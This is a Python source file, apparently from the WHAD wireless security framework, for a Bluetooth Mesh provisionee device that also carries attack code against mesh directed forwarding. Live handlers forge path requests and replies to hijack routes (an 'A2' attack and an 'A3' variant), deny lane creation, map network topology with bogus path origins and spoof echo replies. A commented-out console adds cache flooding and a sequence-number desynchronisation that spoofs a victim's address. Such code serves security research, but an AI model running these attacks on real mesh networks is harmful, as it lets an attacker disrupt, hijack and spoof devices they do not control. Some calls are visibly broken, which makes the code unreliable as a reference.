"""
Bluetooth Mesh PB-ADV Device connector
=========================================

This connector implements a simple PB-ADV enable device. Both algorithms supported
Can be provisioned by a PB-ADV enabled provisioner
It used the BLE core stack.

It then behaves like a Generic On/Off Server.

The connector provides some callbacks such as :meth:`Peripheral.on_connected` to
react on specific events.
"""


# Add arguments to connector for models/states

from whad.btmesh.stack import PBAdvBearerLayer
from whad.btmesh.connectors import BTMesh

from whad.scapy.layers.btmesh import *
from whad.btmesh.crypto import (
    NetworkLayerCryptoManager,
    UpperTransportLayerDevKeyCryptoManager,
)
from whad.btmesh.stack.network import NetworkLayer
from whad.btmesh.stack.utils import MeshMessageContext
from whad.btmesh.stack.constants import (
    MANAGED_FLOODING_CREDS,
    DIRECTED_FORWARDING_CREDS,
)

from whad.btmesh.profile import BaseMeshProfile

from scapy.layers.bluetooth4LE import BTLE_ADV_NONCONN_IND
from threading import Thread, Timer
from time import sleep

from copy import copy


class Provisionee(BTMesh):
    def __init__(
        self,
        device,
        profile=BaseMeshProfile(),
        auto_provision=False,
        net_key=bytes.fromhex("f7a2a44f8e8a8029064f173ddc1e2b00"),
        app_key=bytes.fromhex("63964771734fbd76e3b40519d1d94a48"),
        unicast_addr=b"\x00\x02",
    ):
        """
        Contructor of a Provisionee (node) device
        Support for only one element per node

        :param device: Device object
        :type device: Device
        :param profile: Profile class used for the node (elements and models layout), defaults to BaseMeshProfile
        :param auto_provision: Is the node auto provisioned ?, defaults to False
        :type auto_provision: Bool, optional
        :param net_key: If auto provisioned : primary NetKey , defaults to bytes.fromhex("f7a2a44f8e8a8029064f173ddc1e2b00")
        :type net_key: Bytes, optional
        :param app_key: If auto provisioned : primary app key and dev key, defaults to bytes.fromhex("63964771734fbd76e3b40519d1d94a48")
        :type app_key: Bytes, optional
        :param unicast_addr: If auto provisioned, unicast addr, defaults to b"\x00\x02"
        :type unicast_addr: Bytes, optional
        """
        super().__init__(
            device, profile, stack=PBAdvBearerLayer, options={"role": "provisionee"}
        )

        # List of PATH_REQUESTS received or sent, key is path_origin:FWN and content is a the associated first PATH Request received/sent corresponding
        self.path_requests_processed = {}

        self.whitelist = []

        # used to track sequence number to be used for path echo replies. Key (path_origin:path_target) -> (seq number, creds)
        # if seq is None, use our sequence number
        self.path_echo_reply_list = {}

        # Stores the nodes discovered in the network
        # key is range start, tuple is (range_length, hops)
        self.topology = {}

        if auto_provision:
            self.auto_provision(net_key, app_key, unicast_addr)

    def process_rx_packets(self, packet):
        """
        Process a received Mesh Packet. Sends to stack if provisioning PDU

        :param packet: Packet received
        :type packet: Packet
        """
        if not self.is_provisioned:
            if packet.haslayer(EIR_PB_ADV_PDU):
                self._stack.on_provisioning_pdu(packet.getlayer(EIR_PB_ADV_PDU))
        elif packet.haslayer(BTMesh_Obfuscated_Network_PDU):
            if (
                self.whitelist == []
                or packet.getlayer(BTLE_ADV_NONCONN_IND).AdvA in self.whitelist
            ):
                self._main_stack.on_net_pdu_received(
                    packet.getlayer(BTMesh_Obfuscated_Network_PDU), packet.metadata.rssi
                )

    def provisionning_complete(self, prov_data):
        """
        When Provisionning (not auto) is complete, we received the information to setup the node and start normal behavior with main stack

        :param prov_data: The provisionning data content
        :type prov_data: ProvisioningCompleteData
        """

        primary_net_key = NetworkLayerCryptoManager(
            key_index=prov_data.key_index, net_key=prov_data.net_key
        )
        dev_key = UpperTransportLayerDevKeyCryptoManager(
            provisioning_crypto_manager=prov_data.provisionning_crypto_manager
        )
        self.profile.provision(
            primary_net_key,
            dev_key,
            prov_data.iv_index,
            prov_data.flags,
            int.from_bytes(prov_data.unicast_addr, "big"),
        )

        self._main_stack = NetworkLayer(connector=self, options=self.options)

        self.is_provisioned = True

    def handle_key_press(self, onoff, transaction_id):
        """
        When not in interactive mode, handle a key press
        """
        pkt = BTMesh_Model_Generic_OnOff_Set(onoff=onoff, transaction_id=transaction_id)

        ctx = MeshMessageContext()
        ctx.creds = MANAGED_FLOODING_CREDS
        ctx.src_addr = self.profile.primary_element_addr.to_bytes(2, "big")
        ctx.dest_addr = b"\xff\xff"
        ctx.ttl = 7
        ctx.is_ctl = False
        ctx.net_key_id = 0
        ctx.application_key_index = 0
        ctx.aid = (
            self.profile.get_configuration_server_model()
            .get_state("app_key_list")
            .get_value(0)
            .aid
        )
        pkt = BTMesh_Model_Message() / pkt
        self._main_stack.get_layer("access").process_new_message((pkt, ctx))

    def reset_whitelist(self):
        """
        Resets the whitelist
        """
        self.whitelist = []

    def add_whitelist(self, addr):
        """
        Adds an address to the whitelist

        :param addr: BD Addr to add
        :type addr: str
        """
        addr = addr.lower()
        if addr not in self.whitelist:
            self.whitelist.append(addr)

    def remove_whitelist(self, addr):
        """
        Removes an address from the whitelist

        :param addr: BD Addr to remove
        :type addr: str
        """
        try:
            index = self.whitelist.index(addr.lower())
        except ValueError:
            return
        self.whitelist.pop(index)

    """
    def handle_key_press(self):
        while True:
            cmd = input()
            if cmd == "path_req":
                try:
                    po = int(input("PATH ORIGIN : "), 16)
                    pt = int(input("PATH TARGET : "), 16)
                except ValueError:
                    print("WRONG FORMAT FOR addresses")
                    continue

                pkt = BTMesh_Upper_Transport_Control_Path_Request(
                    on_behalf_of_dependent_origin=0,
                    path_origin_path_metric_type=0,
                    path_discovery_interval=0,
                    path_origin_path_lifetime=0,
                    path_origin_path_metric=0,
                    destination=pt,
                    path_origin_unicast_addr_range=UnicastAddr(range_start=po & 0x7FFF),
                )

                ctx = MeshMessageContext()
                ctx.creds = DIRECTED_FORWARDING_CREDS
                ctx.src_addr = primary_element.addr
                ctx.dest_addr = b"\xff\xfb"  # all directed forwading nodes
                ctx.ttl = 0
                ctx.is_ctl = True
                ctx.net_key_id = 0
                key = str(pkt.path_origin_unicast_addr_range.range_start) + str(
                    pkt.path_origin_forwarding_number
                )
                self.path_requests_processed[key] = (pkt, ctx)

                self._main_stack.get_layer("upper_transport").send_control_message((
                    pkt,
                    ctx,
                ))

            elif cmd == "dep_update":
                try:
                    pe = int(input("PATH ENDPOINT : "), 16)
                    dep_addr = int(input("DEPENDENT NODE ADDR : "), 16)
                except ValueError:
                    print("WRONG FORMAT FOR addresses")
                    continue
                pkt = BTMesh_Upper_Transport_Control_Dependent_Node_Update(
                    type=1,
                    path_endpoint=pe,
                    dependent_node_unicast_addr_range=UnicastAddr(
                        length_present=1,
                        range_length=0xFF,
                        range_start=dep_addr & 0x7FFF,
                    ),
                )
                ctx = MeshMessageContext()
                ctx.creds = DIRECTED_FORWARDING_CREDS
                ctx.src_addr = primary_element.addr
                ctx.dest_addr = b"\xff\xfb"  # all directed forwading nodes
                ctx.ttl = 0
                ctx.is_ctl = True
                ctx.net_key_id = 0
                self._main_stack.get_layer("upper_transport").send_control_message((
                    pkt,
                    ctx,
                ))

            elif cmd == "df_set":
                try:
                    dest = bytes.fromhex(input("DESTINATION : "))
                except ValueError:
                    print("WRONG FORMAT FOR DESTINATION")
                    continue
                pkt = BTMesh_Model_Directed_Forwarding_Control_Set(
                    net_key_index=0,
                    directed_forwarding=1,
                    directed_relay=1,
                    directed_proxy=0xFF,
                    directed_proxy_use_directed_default=0xFF,
                    directed_friend=0xFF,
                )
                global_states = GlobalStatesManager()
                ctx = MeshMessageContext()

                ctx.creds = MANAGED_FLOODING_CREDS
                ctx.src_addr = primary_element.addr
                ctx.dest_addr = dest
                ctx.ttl = 7
                ctx.is_ctl = False
                ctx.net_key_id = 0
                ctx.application_key_index = 0
                ctx.aid = global_states.get_state("app_key_list").get_value(0).aid

                pkt = BTMesh_Model_Message() / pkt
                self._main_stack.get_layer("access").process_new_message((pkt, ctx))

            elif cmd == "on_off":
                try:
                    dest = bytes.fromhex(input("DESTINATION : "))
                    src = bytes.fromhex(input("SRC : "))
                except ValueError:
                    print("WRONG FORMAT FOR ADDR")
                    continue

                pkt = BTMesh_Model_Generic_OnOff_Set(onoff=1, transaction_id=1)

                global_states = GlobalStatesManager()

                ctx = MeshMessageContext()
                ctx.creds = MANAGED_FLOODING_CREDS
                ctx.src_addr = src
                ctx.dest_addr = dest
                ctx.ttl = 1
                ctx.is_ctl = False
                ctx.net_key_id = 0
                ctx.application_key_index = 0
                ctx.aid = global_states.get_state("app_key_list").get_value(0).aid

                pkt = BTMesh_Model_Message() / pkt
                self._main_stack.get_layer("access").process_new_message((pkt, ctx))

            elif cmd == "onoff_df":
                try:
                    dest = bytes.fromhex(input("DESTINATION : "))
                    src = bytes.fromhex(input("SRC : "))
                except ValueError:
                    print("WRONG FORMAT FOR ADDR")
                    continue

                pkt = BTMesh_Model_Generic_OnOff_Set(onoff=1, transaction_id=1)

                global_states = GlobalStatesManager()

                ctx.creds = DIRECTED_FORWARDING_CREDS
                ctx.src_addr = src
                ctx.dest_addr = dest
                ctx.ttl = 0
                ctx.is_ctl = False
                ctx.net_key_id = 0
                ctx.application_key_index = 0
                ctx.aid = global_states.get_state("app_key_list").get_value(0).aid

                pkt = BTMesh_Model_Message() / pkt
                self._main_stack.get_layer("access").process_new_message((pkt, ctx))

            elif cmd == "fw_get":
                try:
                    dest = bytes.fromhex(input("DESTINATION : "))
                    fw_update_id = int(input("FORWARDING TABLE UPDATE ID (decimal) : "))
                except ValueError:
                    print("WRONG FORMAT FOR parameters")
                    continue

                pkt = BTMesh_Model_Directed_Forwarding_Table_Entries_Get(
                    filter_mask=0b0010,
                    net_key_index=0,
                    start_index=0,
                    forwarding_table_update_identifier=fw_update_id,
                )
                global_states = GlobalStatesManager()
                ctx = MeshMessageContext()

                ctx.creds = MANAGED_FLOODING_CREDS
                ctx.src_addr = primary_element.addr
                ctx.dest_addr = dest
                ctx.ttl = 0
                ctx.is_ctl = False
                ctx.net_key_id = 0
                ctx.application_key_index = 0
                ctx.aid = global_states.get_state("app_key_list").get_value(0).aid

                pkt = BTMesh_Model_Message() / pkt
                self._main_stack.get_layer("access").process_new_message((pkt, ctx))
            elif cmd == "dep_get":
                try:
                    dest = bytes.fromhex(input("DESTINATION : "))
                    po = int(input("PATH ORIGIN : "), 16)
                    pt = int(input("PATH TARGET : "), 16)
                    fw_update_id = int(input("FORWARDING TABLE UPDATE ID (decimal) : "))
                except ValueError:
                    print("WRONG FORMAT FOR parameters")
                    continue

                pkt = BTMesh_Model_Directed_Forwarding_Table_Dependents_Get(
                    fixed_path_flag=0,
                    dependents_list_mask=0b11,
                    net_key_index=0,
                    start_index=0,
                    path_origin=po,
                    destination=pt,
                    forwarding_table_update_identifier=fw_update_id,
                )
                global_states = GlobalStatesManager()
                ctx = MeshMessageContext()

                ctx.creds = MANAGED_FLOODING_CREDS
                ctx.src_addr = primary_element.addr
                ctx.dest_addr = dest
                ctx.ttl = 0
                ctx.is_ctl = False
                ctx.net_key_id = 0
                ctx.application_key_index = 0
                ctx.aid = global_states.get_state("app_key_list").get_value(0).aid

                pkt = BTMesh_Model_Message() / pkt
                self._main_stack.get_layer("access").process_new_message((pkt, ctx))

            elif cmd == "path_req_flood":
                try:
                    nb_path_req = int(input("NB OF PATH_REQ : "))
                except ValueError:
                    print("WRONG FORMAT FOR nb_path_req")
                    continue

                pkt = BTMesh_Upper_Transport_Control_Path_Request(
                    on_behalf_of_dependent_origin=0,
                    path_origin_path_metric_type=0,
                    path_discovery_interval=1,
                    path_origin_path_lifetime=0,
                    path_origin_path_metric=0,
                )
                ctx = MeshMessageContext()
                ctx.creds = DIRECTED_FORWARDING_CREDS
                ctx.src_addr = primary_element.addr
                ctx.dest_addr = b"\xff\xfb"  # all directed forwading nodes
                ctx.ttl = 0
                ctx.is_ctl = True
                ctx.net_key_id = 0

                flood_thread = Thread(
                    target=self.cache_flood_thread, args=((pkt, ctx), nb_path_req)
                )
                flood_thread.start()

            elif cmd == "path_soli":
                try:
                    addr1 = int(input("ADDR1 (path exists on victims) : "), 16)
                    addr2 = int(
                        input(
                            "ADDR2 (path doesnt exist, fake addr, 0x00FE to attack) : "
                        ),
                        16,
                    )
                except ValueError:
                    print("WRONG FORMAT FOR addrs")
                    continue

                pkt = BTMesh_Upper_Transport_Control_Path_Request_Solicitation(
                    addr_list=[addr1, addr2]
                )
                ctx = MeshMessageContext()
                ctx.creds = DIRECTED_FORWARDING_CREDS
                ctx.src_addr = primary_element.addr
                ctx.dest_addr = b"\xff\xfb"  # all directed forwading nodes
                ctx.ttl = 0x7F
                ctx.is_ctl = True
                ctx.net_key_id = 0

                self._main_stack.get_layer("upper_transport").send_control_message((
                    pkt,
                    ctx,
                ))

            elif cmd == "wl_add":
                try:
                    addr = input("BDADDR : ").lower()
                except ValueError:
                    print("WRONG FORMAT FOR BDADDR")
                    continue

                self.whitelist.append(addr)
                print(self.whitelist)

            elif cmd == "wl_reset":
                self.whitelist = []

            elif cmd == "topology":
                try:
                    addr_low = int(input("MIN_ADDR : "), 16)
                    addr_high = int(input("MAX_ADDR : "), 16)
                except ValueError:
                    print("WRONG FORMAT FOR addrs")
                    continue

                thread = Thread(
                    target=self.discover_topology_thread, args=[addr_low, addr_high]
                )
                thread.start()

            elif cmd == "topology_hops":
                thread = Thread(target=self.discover_topology_hops_thread)
                thread.start()

            elif cmd == "topology_show":
                for key, value in self.topology.items():
                    print(
                        "{addr}, {range_length}, {hops}".format(
                            addr=key, range_length=value[0], hops=value[1]
                        )
                    )

            elif cmd == "seq_num_desynch":
                try:
                    victim = bytes.fromhex(input("VICTIME ADDR : "))
                except ValueError:
                    print("WRONG FORMAT FOR addr")
                    continue

                ctx = MeshMessageContext()
                ctx.creds = MANAGED_FLOODING_CREDS
                ctx.src_addr = victim
                ctx.dest_addr = b"\xff\xff"
                ctx.ttl = 0x7F
                ctx.is_ctl = True
                ctx.net_key_id = 0

                pkt = BTMesh_Upper_Transport_Control_Heartbeat(
                    init_ttl=0x7F, features=0
                )
                ctx.seq_number = 0xFFFFFF
                self._main_stack.send_from(
                    "upper_transport", "lower_transport", (pkt, ctx)
                )

            elif cmd == "set_seq":
                try:
                    seq = int(input("seq : "), 16)
                except ValueError:
                    print("WRONG FORMAT FOR SEQ")
                    continue

                global_states = GlobalStatesManager()
                global_states.set_seq_number(seq)

            else:
                print(
                    "Available commands : \n - path_req : Send a Path Request \n - on_off : send an onoff message \n - df_set : send a DF_CONTROL_SET message to enable DF"
                )
                print(
                    "- onoff_df : send an onof msg with DF \n - dep_update : sends a dependent node update message \n - fw_get : Get FWT entries of destination"
                )
                print(
                    "- dep_get : Gets the dependent node of a path \n - path_req_flood : Cache flood of Discovery Table \n - path_soli : Send a Path_req_Solicitation"
                )
                print(
                    "- wl_add : Add addr to whitelist \n - wl_reset : reset whitelist \n - seq_num_desynch : Send msg with max seq num (spoof addr) \n - topology : Used directed fw to get all nodes in the net and the nb of hops to them"
                )
                print(
                    "- topology_hops : Sends PATH_ECHO_REQUEST to get distance from nodes \n - topology_show : Show disovered nodes \n - set_seq : Set sequence number"
                )

            sleep(1)

    def cache_flood_thread(self, message, nb_path_req):
        pkt, ctx = message
        while nb_path_req > 0:
            pkt.destination = randrange(1, 0x7FFF)
            pkt.path_origin_unicast_addr_range = UnicastAddr(
                range_start=randrange(1, 0x7FFF) & 0x7FFF
            )
            self._main_stack.get_layer("upper_transport").send_control_message((
                pkt,
                ctx,
            ))
            sleep(0.5)
            nb_path_req -= 1
    """

    def discover_topology_thread(self, addr_low, addr_high):
        """
        "Attack" to discover all the nodes that support DF (they all should ...) and the distance to them

        We send PATH_REQUEST with a PATH_ORIGIN that doesnt exist (very high address) for all the addrs in the range specified

        :param addr_low: [TODO:description]
        :type addr_low: [TODO:type]
        :param addr_high: [TODO:description]
        :type addr_high: [TODO:type]
        """
        base_pkt = BTMesh_Upper_Transport_Control_Path_Request(
            on_behalf_of_dependent_origin=0,
            path_origin_path_metric_type=0,
            path_discovery_interval=0,
            path_origin_path_lifetime=0,
            path_origin_path_metric=0,
            destination=0,
            path_origin_unicast_addr_range=UnicastAddr(range_start=0x7FFF),
        )
        base_ctx = MeshMessageContext()
        base_ctx.creds = DIRECTED_FORWARDING_CREDS
        base_ctx.src_addr = self.state.profile.primary_element_addr.to_bytes(2, "big")
        base_ctx.dest_addr = b"\xff\xfb"  # all directed forwading nodes
        base_ctx.ttl = 0
        base_ctx.is_ctl = True
        base_ctx.net_key_id = 0

        for dest in range(addr_low, addr_high + 1):
            base_pkt.destination = dest
            self._main_stack.get_layer("upper_transport").send_control_message((
                base_pkt,
                base_ctx,
            ))
            sleep(0.5)

    def discover_topology_hops_thread(self):
        """
        Sends a PATH_ECHO_REQUEST to all discvered nodes to get the distance to them
        """
        for addr in self.topology.keys():
            base_pkt = BTMesh_Upper_Transport_Control_Path_Echo_Request()
            base_ctx = MeshMessageContext()
            base_ctx.creds = DIRECTED_FORWARDING_CREDS
            base_ctx.src_addr = b"\x7f\xff"
            base_ctx.dest_addr = addr.to_bytes(2, "big")
            base_ctx.ttl = 0x7F
            base_ctx.is_ctl = True
            base_ctx.net_key_id = 0
            self._main_stack.get_layer("upper_transport").send_control_message((
                base_pkt,
                base_ctx,
            ))

    def on_path_request_react_attack(self, message):
        """
        Path Request React attack (A2) path request handler
        """

        pkt, ctx = message
        key = str(pkt.path_origin_unicast_addr_range.range_start) + str(
            pkt.path_origin_forwarding_number
        )

        # If we already received that Path Request, discard
        if key in self.path_requests_processed.keys():
            return

        self.path_requests_processed[key] = message
        print("RECEIVED PATH REQ :")
        pkt.show()

        if pkt.destination == 0x00FE:
            print("PATH REQ FOR 0x00FE, A3 attack, SENDING PATH REPLY")
            resp_pkt = BTMesh_Upper_Transport_Control_Path_Reply(
                unicast_destination=1,
                on_behalf_of_dependent_target=1,
                confirmation_request=0,
                path_origin=pkt.path_origin_unicast_addr_range.range_start,
                path_origin_forwarding_number=pkt.path_origin_forwarding_number,
                path_target_unicast_addr_range=UnicastAddr(
                    length_present=1, range_start=0x0100 & 0x7FFF, range_length=0xFF
                ),
                dependent_target_unicast_addr_range=UnicastAddr(
                    length_present=1,
                    range_length=0xFF,
                    range_start=0x0001 & 0x7FFF,
                ),
            )
            resp_ctx = copy(ctx)
            resp_ctx.src_addr = self.state.profile.primary_element_addr.to_bytes(
                2, "big"
            )
            resp_ctx.dest_addr = ctx.src_addr
            resp_ctx.creds = DIRECTED_FORWARDING_CREDS
            timer = Timer(
                1,
                self._main_stack.get_layer("upper_transport").send_control_message,
                args=[(resp_pkt, resp_ctx)],
            )

            timer.start()

            # start path echo reply thread
            key = str(resp_pkt.path_origin) + str(
                resp_pkt.path_target_unicast_addr_range.range_start
            )
            self.path_echo_reply_list[key] = (1, MANAGED_FLOODING_CREDS)
            echo_reply_timer = Thread(
                3,
                self.path_echo_reply_send,
                args=[
                    resp_pkt.path_origin,
                    resp_pkt.path_target_unicast_addr_range.range_start,
                ],
            )
            echo_reply_timer.start()

            return

        if self.state.profile.is_unicast_addr_our(pkt.destination):
            print(
                "PATH REQ FOR US, SENDING PATH REPLY with PathConfirmation (for DEP_NODES_UPDATE ATTACK)"
            )
            resp_pkt = BTMesh_Upper_Transport_Control_Path_Reply(
                unicast_destination=1,
                on_behalf_of_dependent_target=0,
                confirmation_request=1,
                path_origin=pkt.path_origin_unicast_addr_range.range_start,
                path_origin_forwarding_number=pkt.path_origin_forwarding_number,
                path_target_unicast_addr_range=UnicastAddr(
                    length_present=0,
                    range_start=int.from_bytes(
                        self.state.profile.primary_element_addr, "big"
                    )
                    & 0x7FFF,
                ),
            )
            resp_ctx = copy(ctx)
            resp_ctx.src_addr = self.state.profile.primary_element_addr.to_bytes(
                2, "big"
            )
            resp_ctx.dest_addr = ctx.src_addr
            resp_ctx.creds = DIRECTED_FORWARDING_CREDS
            timer = Timer(
                1,
                self._main_stack.get_layer("upper_transport").send_control_message,
                args=[(resp_pkt, resp_ctx)],
            )
            timer.start()

            key = str(resp_pkt.path_origin) + str(
                resp_pkt.path_target_unicast_addr_range.range_start
            )
            self.path_echo_reply_list[key] = (None, MANAGED_FLOODING_CREDS)
            echo_reply_timer = Timer(
                3,
                self.path_echo_reply_send,
                args=[
                    resp_pkt.path_origin,
                    resp_pkt.path_target_unicast_addr_range.range_start,
                ],
            )
            echo_reply_timer.start()

            return

        print("RECEIVED PATH REQUEST NOT FOR US, ATTACK A2 launched")

        # Sending the forged Path Request with best metric
        resp_pkt = pkt
        resp_pkt.path_origin_path_metric = 0

        resp_ctx = copy(ctx)
        resp_ctx.creds = DIRECTED_FORWARDING_CREDS
        resp_ctx.src_addr = self.state.profile.primary_element_addr.to_bytes(2, "big")
        resp_ctx.dest_addr = b"\xff\xfb"
        resp_ctx.ttl = 0
        resp_ctx.is_ctl = True
        resp_ctx.net_key_id = 0

        self._main_stack.get_layer("upper_transport").send_control_message((
            resp_pkt,
            resp_ctx,
        ))

        # Sending a Path Reply to the node that sent us the Path Request
        resp_ctx = MeshMessageContext()
        resp_ctx.creds = DIRECTED_FORWARDING_CREDS
        resp_ctx.src_addr = self.state.profile.primary_element_addr.to_bytes(2, "big")
        resp_ctx.dest_addr = ctx.src_addr
        resp_ctx.ttl = 0
        resp_ctx.is_ctl = True
        resp_ctx.net_key_id = 0

        # optimize the target ranges to get the first 512 addr possible from 1 to 512
        # we always make sure that either the path_target or dependent target contain the 255 first addrs
        destination_start = (pkt.destination // 255) * 255 + 1
        dep_nodes_start = (int(destination_start == 0) + 1) * 255 + 1

        resp_pkt = BTMesh_Upper_Transport_Control_Path_Reply(
            unicast_destination=1,
            on_behalf_of_dependent_target=1,
            confirmation_request=0,
            path_origin=pkt.path_origin_unicast_addr_range.range_start,
            path_origin_forwarding_number=pkt.path_origin_forwarding_number,
            path_target_unicast_addr_range=UnicastAddr(
                length_present=1, range_start=dep_nodes_start, range_length=0xFF
            ),
            dependent_target_unicast_addr_range=UnicastAddr(
                length_present=1,
                range_length=0xFF,
                range_start=destination_start,
            ),
        )
        resp_pkt.show()
        self._main_stack.get_layer("upper_transport").send_control_message((
            resp_pkt,
            resp_ctx,
        ))

        timer = Timer(0.5, self.path_request_react_send_request_lane, args=[message])
        timer.start()

    def path_request_react_send_request_lane(self, message):
        """
        For attack A2, functioned called 500ms after receiving the Path Request. Used to send a Path Request to keep nodes from creating lanes

        :param message: Original Path Request message received
        :type message: (BTMesh_Upper_Transport_Control_Path_Request, MeshMessageContext)
        """
        pkt, ctx = message

        resp_ctx = copy(ctx)
        resp_pkt = copy(pkt)
        ctx.src_addr = self.state.profile.primary_element_addr.to_bytes(2, "big")
        resp_pkt.path_origin_path_metric = 0
        resp_pkt.path_origin_forwarding_number = pkt.path_origin_forwarding_number + 1

        resp_ctx.creds = DIRECTED_FORWARDING_CREDS
        resp_ctx.src_addr = self.state.profile.primary_element_addr.to_bytes(2, "big")
        resp_ctx.dest_addr = b"\xff\xfb"
        resp_ctx.ttl = 0
        resp_ctx.is_ctl = True
        resp_ctx.net_key_id = 0

        key = str(resp_pkt.path_origin_unicast_addr_range.range_start) + str(
            resp_pkt.path_origin_forwarding_number
        )
        self.path_requests_processed[key] = message

        print("SENDING PATH REQUEST FOR LANE CREATION DENIAL")
        self._main_stack.get_layer("upper_transport").send_control_message((
            resp_pkt,
            resp_ctx,
        ))

    def on_path_reply(self, message):
        """
        On Path Reply received

        :param message: Path Reply Received with its context
        :type message: (BTMesh_Upper_Transport_Control_Path_Reply,MeshMessageContext)
        """

        pkt, ctx = message
        # reply probably for the topology discovery
        if pkt.path_origin == 0x7FFF:
            if pkt.path_target_unicast_addr_range.length_present:
                range_length = pkt.path_target_unicast_addr_range.range_length
            else:
                range_length = 0
            print(
                "FOUND A NODE {range_start} with range {range_length}".format(
                    range_start=pkt.path_target_unicast_addr_range.range_start,
                    range_length=range_length,
                )
            )

            self.topology[pkt.path_target_unicast_addr_range.range_start] = (
                range_length,
                -1,
            )
            return

        # Send Path Confirmation if Path Reply for our address
        if self.state.profile.is_unicast_addr_our(pkt.path_origin):
            print("PATH REPLY FOR US")
            if pkt.confirmation_request == 1:
                print("SENDING CONFIRMATION REQUEST")
                resp_pkt = BTMesh_Upper_Transport_Control_Path_Confirmation(
                    path_origin=pkt.path_origin,
                    path_target=pkt.path_target_unicast_addr_range.range_start,
                )
                resp_ctx = MeshMessageContext()
                resp_ctx.creds = DIRECTED_FORWARDING_CREDS
                resp_ctx.src_addr = self.state.profile.primary_element_addr.to_bytes(
                    2, "big"
                )
                resp_ctx.dest_addr = (
                    pkt.path_target_unicast_addr_range.range_start.to_bytes(2, "big")
                )
                resp_ctx.ttl = 0
                resp_ctx.is_ctl = True
                resp_ctx.net_key_id = 0
                self._main_stack.get_layer("upper_transport").send_control_message((
                    resp_pkt,
                    resp_ctx,
                ))

                # update credentials for echo reply
                key = str(pkt.path_origin) + str(pkt.path_target)
                self.path_echo_reply_list[key] = (None, DIRECTED_FORWARDING_CREDS)

                return

    def on_path_confirmation(self, message):
        """
        On path confirmation. If for us, update credentials used for Path Echo Reply

        :param message: [TODO:description]
        :type message: [TODO:type]
        """

        pkt, ctx = message
        if self.state.profile.is_unicast_addr_our(pkt.path_origin):
            key = str(pkt.path_origin) + str(pkt.path_target)
            self.path_echo_reply_list[key] = (None, DIRECTED_FORWARDING_CREDS)

    """
    def path_request_react_send_reply(self, key):
        min_hop = 1000
        next_hop_addr = 0
        message = None
        for msg in self.path_requests_received.pop(key):
            pkt, ctx = msg
            if pkt.path_origin_path_metric < min_hop:
                next_hop_addr = ctx.src_addr
                message = msg

        pkt, ctx = message

        resp_ctx = MeshMessageContext()
        resp_ctx.creds = DIRECTED_FORWARDING_CREDS
        resp_ctx.src_addr = self.unicast_addr
        resp_ctx.dest_addr = next_hop_addr
        resp_ctx.ttl = 0
        resp_ctx.is_ctl = True
        resp_ctx.net_key_id = 0

        # optimize the target ranges to get the first 512 addr possible from 1 to 512
        # we always make sure that either the path_target or dependent target contain the 255 first addrs
        destination_start = (pkt.destination // 255) * 255 + 1
        dep_nodes_start = (int(destination_start == 0) + 1) * 255 + 1

        resp_pkt = BTMesh_Upper_Transport_Control_Path_Reply(
            unicast_destination=1,
            on_behalf_of_dependent_target=1,
            confirmation_request=0,
            path_origin=pkt.path_origin_unicast_addr_range.range_start,
            path_origin_forwarding_number=pkt.path_origin_forwarding_number,
            path_target_unicast_addr_range=UnicastAddr(
                length_present=1, range_start=dep_nodes_start, range_length=0xFF
            ),
            dependent_target_unicast_addr_range=UnicastAddr(
                length_present=1,
                range_length=0xFF,
                range_start=destination_start,
            ),
        )
        print("SENDING")
        resp_pkt.show()
        self._main_stack.get_layer("upper_transport").send_control_message((
            resp_pkt,
            resp_ctx,
        ))
        """

    def path_echo_reply_hander(self, message):
        pkt, ctx = message

        print(
            "NODE WITH ADDR {addr} is {hops} hops away".format(
                addr=ctx.src_addr, hops=0x7F - ctx.ttl
            )
        )
        self.topology[int.from_bytes(ctx.src_addr, "big")] = (
            self.topology[int.from_bytes(ctx.src_addr, "big")][0],
            0x7F - ctx.ttl,
        )
        return

    def path_echo_reply_send(self, path_origin, path_target):
        """
        Launched in a thread to regularly send path echo reply messages for tampered paths

        :param path_origin: Primary Address of the PO
        :type path_origin: int
        :param path_target: Primary address of the PT
        :type path_target: int
        """
        while True:
            key = str(path_origin) + str(path_target)
            seq, creds = self.path_echo_reply_list[key]
            pkt = BTMesh_Upper_Transport_Control_Path_Echo_Reply(
                destination=path_target
            )
            ctx = MeshMessageContext()
            ctx.creds = creds
            ctx.src_addr = path_target.to_bytes(2, "big")
            ctx.dest_addr = path_origin.to_bytes(2, "big")
            ctx.ttl = 0x7F
            ctx.is_ctl = True
            ctx.net_key_id = 0
            if seq is not None:
                ctx.seq_number = seq
                self.path_echo_reply_list[key] = (seq + 1, creds)

            self._main_stack.get_layer("upper_transport").send_control_message((
                pkt,
                ctx,
            ))
            sleep(4.5)
